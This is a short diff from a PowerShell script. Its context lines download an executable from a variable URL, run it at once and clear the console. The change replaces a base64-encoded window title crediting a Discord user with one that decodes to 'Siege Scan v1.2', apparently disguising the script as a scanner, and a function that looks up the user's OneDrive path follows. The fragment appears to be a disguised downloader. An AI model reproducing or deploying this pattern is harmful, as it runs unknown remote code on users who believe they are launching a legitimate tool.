@@ -5,7 +5,7 @@ Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath
 
 Clear-Host
-$encodedTitle = "Q3JlYXRlZCBCeSBaZXlza2kgb24gRGlzY29yZA=="
+$encodedTitle = "U2llZ2UgU2NhbiB2MS4y"
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
 $Host.UI.RawUI.WindowTitle = $titleText
 function Get-OneDrivePath {
